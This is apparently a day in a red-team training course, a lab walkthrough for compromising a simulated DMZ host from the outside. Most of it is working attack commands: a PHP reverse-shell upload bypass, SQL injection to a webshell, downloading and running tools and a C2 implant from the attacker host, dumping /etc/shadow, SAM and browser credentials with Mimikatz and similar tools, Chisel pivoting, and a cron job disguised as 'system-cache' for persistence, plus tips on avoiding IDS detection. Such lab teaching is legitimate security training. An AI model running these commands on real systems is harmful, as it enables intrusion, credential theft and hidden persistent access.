---
title: "Offshore Lab Episode 1 — External Recon to DMZ Foothold"
tags: [red-team, offshore, lab, external-recon, initial-access, web-exploitation,
  privilege-escalation, C2, DMZ, pivoting, ATT&CK, T1190, T1059, T1078]
module: 08-RedTeam-03
day: 535
related_topics:
  - Offshore Environment Methodology (Day 534)
  - Offshore Lab Episode 2 (Day 536)
  - Recon fundamentals (Days 51–75)
  - Web Exploitation (Days 76–165)
---

# Day 535 — Offshore Lab Episode 1: External Recon to DMZ Foothold

> "Every engagement starts the same way: you are on the outside, looking at
> a wall. Your job is to find the door. Not the obvious door — the one that
> someone left unlocked because they thought it was behind enough layers that
> nobody would bother. Find that door, get through it, and establish yourself
> before anyone notices. Everything else comes after."
>
> — Ghost

---

## Goals

Execute a systematic external recon against a multi-zone lab environment.
Identify and exploit an initial access vector to gain a foothold in the DMZ.
Establish a stable, persistent C2 beacon from the compromised DMZ host.
Escalate privileges to root or SYSTEM on the DMZ host.
Stage for the internal pivot (Episode 2).

**Prerequisites:** Day 534 (offshore methodology), Recon track (Days 51–75),
Web exploitation (Days 76–165), C2 deployment (Days 491–493).
**Time budget:** 5 hours. This is a practical lab day — no reading, only doing.

---

## Lab Environment

```
You are an attacker on the internet. Your objectives:
  1. Identify exploitable entry points on the external zone
  2. Gain remote code execution on at least one DMZ host
  3. Escalate to the highest privilege on that host
  4. Establish a C2 beacon with a stable callback channel

External zone (your targets initially):
  10.10.110.0/24 — simulated internet-facing hosts
  Hosts to discover: web server, VPN endpoint, mail gateway, admin panel

Your attack host IP: 10.10.254.10 (simulated attack VPS)

Success criterion for Episode 1:
  ☐ At least one shell on a DMZ host
  ☐ Escalated to root or SYSTEM
  ☐ Credentials harvested from the DMZ host
  ☐ Pivot infrastructure deployed and tested
  ☐ Notes complete: IPs, credentials, access paths documented
```

---

## Phase 1 — External Recon (90 min)

### Step 1.1 — Fast Initial Scan

```bash
# Masscan first — find live hosts and open ports quickly
masscan -p80,443,8080,8443,22,21,25,3389,1433,3306 \
    10.10.110.0/24 --rate=2000 -oG external_masscan.txt

# Parse results
grep "open" external_masscan.txt | awk '{print $4, $3}' | sort -u

# Targeted nmap on discovered hosts for service fingerprinting
cat external_masscan.txt | grep "open" | \
    awk '{print $4}' | cut -d/ -f1 | sort -u > live_hosts.txt

nmap -sV -sC -Pn -p 22,80,443,8080,8443,3389 \
    -iL live_hosts.txt -oA nmap_external
```

### Step 1.2 — Web Enumeration on Discovered HTTP Hosts

```bash
# For each web server discovered (replace IPs as needed):
TARGET_WEB="10.10.110.10"

# Subdomain and virtual host discovery
ffuf -u http://$TARGET_WEB -H "Host: FUZZ.corp.local" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -mc 200,301,302 -o vhost_fuzz.json

# Directory and endpoint discovery
ffuf -u http://$TARGET_WEB/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
    -mc 200,301,302,401,403 -o dir_fuzz.json

# Technology fingerprinting
whatweb http://$TARGET_WEB
curl -I http://$TARGET_WEB

# Check for common exposed files
curl -s http://$TARGET_WEB/robots.txt
curl -s http://$TARGET_WEB/.git/HEAD
curl -s http://$TARGET_WEB/phpinfo.php
curl -s http://$TARGET_WEB/wp-login.php
curl -s http://$TARGET_WEB/admin
```

### Step 1.3 — Vulnerability Scanning

```bash
# Nuclei — fast vulnerability scanner against all discovered hosts
nuclei -l live_hosts.txt \
    -t /root/nuclei-templates/cves/ \
    -t /root/nuclei-templates/misconfiguration/ \
    -t /root/nuclei-templates/exposures/ \
    -o nuclei_results.txt -severity critical,high,medium

# nikto for web-specific checks
nikto -h http://$TARGET_WEB -output nikto_results.txt

# testssl for TLS issues on HTTPS targets
testssl.sh https://$TARGET_WEB
```

---

## Phase 2 — Exploit Development and Initial Access (60 min)

```
At this point you should have identified at least one of the following:
  - An unpatched vulnerability (CVE with public PoC)
  - A misconfigured service (anonymous FTP, writable SMB share, default creds)
  - A vulnerable web application (SQLi, RCE, file upload, SSTI)
  - Exposed admin panel with default credentials

Prioritise exploitation paths:
  P1: Remote code execution (directly gives shell)
  P2: Authentication bypass (leads to RCE)
  P3: File read / SSRF (may lead to credential disclosure → access)
  P4: Information disclosure (may reveal credentials or internal structure)

Document your chosen path:
  Vulnerability: ____________________________________________
  CVE or CWE: _______________________________________________
  PoC source: _______________________________________________
  Expected outcome: _________________________________________
```

### Example Exploitation — PHP Upload Bypass to Shell

```bash
# If a file upload exists with extension filtering:

# Step 1: Confirm upload endpoint
curl -X POST http://$TARGET_WEB/upload.php \
    -F "file=@test.txt" -F "submit=Upload"

# Step 2: Bypass extension filter (PHP webshell in disguised file)
cp /usr/share/webshells/php/php-reverse-shell.php shell.php.png

# Step 3: Intercept with Burp, change Content-Type to image/png
# Change filename from shell.php.png back to shell.php in the request

# Step 4: Trigger the shell
nc -lvnp 4444
curl http://$TARGET_WEB/uploads/shell.php
```

### Example Exploitation — SQL Injection to RCE

```bash
# If SQLi is found in a parameter:
sqlmap -u "http://$TARGET_WEB/search?id=1" \
    --dbs --batch --level=3 --risk=2

# Check for file write privilege
sqlmap -u "http://$TARGET_WEB/search?id=1" \
    --file-write=/tmp/shell.php \
    --file-dest=/var/www/html/shell.php --batch

# Shell via uploaded webshell
curl "http://$TARGET_WEB/shell.php?cmd=id"
```

---

## Phase 3 — Privilege Escalation on DMZ Host (45 min)

### Linux DMZ Host

```bash
# Step 1: Basic enumeration
id && whoami && hostname && cat /etc/passwd
uname -a && cat /etc/os-release

# Step 2: Quick wins first
sudo -l                                    # sudo privileges
find / -perm -4000 -type f 2>/dev/null     # SUID binaries
find / -writable -type f 2>/dev/null | grep -v proc   # writable files
crontab -l && ls -la /etc/cron.*           # cron jobs

# Step 3: Automated enumeration
wget -q http://10.10.254.10/linpeas.sh -O /tmp/lpe.sh
chmod +x /tmp/lpe.sh && /tmp/lpe.sh | tee /tmp/lpe_out.txt

# Step 4: Follow highest-confidence path to root
# Common: sudo misconfiguration, SUID exploit, kernel exploit,
#         writable cron script, PATH hijacking
```

### Windows DMZ Host

```powershell
# Step 1: System information
whoami /all
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
net user & net localgroup administrators

# Step 2: WinPEAS
.\winpeas.exe | Out-File -FilePath C:\Temp\winpeas_out.txt

# Step 3: Quick privilege escalation checks
# SeImpersonatePrivilege → PrintSpoofer or GodPotato
.\PrintSpoofer.exe -i -c cmd.exe
# or:
.\GodPotato.exe -cmd "cmd /c whoami > C:\Temp\privesc.txt"

# AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## Phase 4 — Credential Harvesting and Pivot Setup (45 min)

### Linux Credential Harvesting

```bash
# After root:
cat /etc/shadow                            # password hashes
cat /etc/passwd                            # user list

# Configuration files with credentials
grep -rn "password\|passwd\|pwd\|secret\|token" \
    /var/www /opt /home --include="*.php,*.conf,*.ini,*.env,*.xml" 2>/dev/null

# SSH keys
find /home /root -name "id_rsa" 2>/dev/null
find /home /root -name "*.pem" 2>/dev/null

# Browser credential files
find /home -path "*/mozilla/firefox/*/logins.json" 2>/dev/null
```

### Windows Credential Harvesting

```powershell
# SAM and SYSTEM dump (as SYSTEM or admin)
reg save HKLM\sam C:\Temp\sam
reg save HKLM\system C:\Temp\system

# On attack host:
impacket-secretsdump -sam sam -system system LOCAL

# If Mimikatz available:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# DPAPI / browser credentials
.\SharpChrome.exe logins
.\SharpDPAPI.exe credentials /unprotected
```

### Pivot Deployment

```bash
# Option A: Chisel (recommended for HTTP/HTTPS-only environments)
# On attack host — start Chisel server
./chisel server -p 8080 --reverse --socks5

# On compromised DMZ host (upload via webshell or shell)
./chisel client 10.10.254.10:8080 R:1080:socks

# Verify pivot on attack host
curl --socks5 127.0.0.1:1080 http://10.10.10.1    # should reach internal

# Option B: Ligolo-ng
# (see Day 534 for setup — preferred for complex environments)

# Option C: SSH dynamic forward (if SSH access available on DMZ host)
ssh -D 1080 -N -f -i ./id_rsa user@10.10.110.10
```

---

## Phase 5 — C2 Beacon Deployment

```bash
# Generate C2 implant (Sliver example)
# On Sliver server:
generate --http <REDIRECTOR_IP>:443 --skip-symbols \
    --os linux --arch amd64 --name dmz_beacon --save /tmp/

# Transfer to DMZ host via webshell, curl, or existing shell:
wget http://10.10.254.10:8000/dmz_beacon -O /tmp/.cache/dmz_beacon
chmod +x /tmp/.cache/dmz_beacon

# Execute with nohup for persistence across shell loss:
nohup /tmp/.cache/dmz_beacon > /dev/null 2>&1 &

# Verify callback on Sliver teamserver
sessions

# Establish stable persistence (one method from Days 531–533):
# Linux: add to /etc/cron.d/
echo "*/5 * * * * root /tmp/.cache/dmz_beacon > /dev/null 2>&1" \
    > /etc/cron.d/system-cache
```

---

## Episode 1 Completion Checklist

```
Before moving to Episode 2, verify all of these:

  External Recon:
  ☐ All external hosts discovered and documented with ports/services
  ☐ Nuclei or manual vuln scan complete — findings documented
  ☐ Initial access vector documented with full reproduction steps

  DMZ Foothold:
  ☐ Shell obtained on DMZ host — documented: hostname, IP, OS, user
  ☐ Privilege escalation to root/SYSTEM — documented: technique used
  ☐ Proof screenshot: whoami && id && hostname && ip a

  Credential Harvesting:
  ☐ /etc/shadow or SAM dumped and cracked (at least partial)
  ☐ Config files searched for plaintext credentials
  ☐ All discovered credentials logged in notes

  Pivot and C2:
  ☐ Pivot deployed and functional (nmap through it works)
  ☐ C2 beacon active and stable (callback confirmed)
  ☐ Internal subnet(s) identified (at least one)

  Notes:
  ☐ All commands run are logged (script or tmux logging)
  ☐ IPs, usernames, passwords in structured notes
  ☐ Network diagram updated with confirmed topology

  Red Flags (things that would get you caught):
  ☐ Did you scan too aggressively and hit IDS thresholds?
  ☐ Did you use Metasploit default signatures on an IDS-monitored network?
  ☐ Did your implant phone home on an unusual port or URI pattern?
```

---

## Key Takeaways

1. External recon is not optional — it is the foundation of every successful
   engagement. Missed assets during recon become blind spots that follow you
   through the entire engagement.
2. Initial access technique selection is contextual, not sequential. Evaluate
   all discovered vulnerabilities, then exploit the highest-confidence path
   first. Certainty > theoretical severity.
3. The DMZ host is a stepping stone, not a destination. Its value is the pivot
   it provides to the internal network, the credentials it holds from service
   accounts and config files, and the trust it has with internal systems.
4. Credential harvesting on the first compromised host is the single highest-ROI
   action in any engagement. Service account credentials in config files
   frequently have access far beyond their intended scope.
5. C2 beacon stability is non-negotiable. If your callback drops, you lose access
   to everything behind the pivot. Deploy persistence on the DMZ host and test
   the beacon survives a simulated callback interruption.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q535.1, Q535.2 …).

---

## Navigation

← Previous: [Day 534 — Offshore Environment Methodology](DAY-0534-Offshore-Environment-Methodology.md)
→ Next: [Day 536 — Offshore Lab Episode 2: Internal Pivoting](DAY-0536-Offshore-Lab-Episode-2-Internal-Pivoting.md)
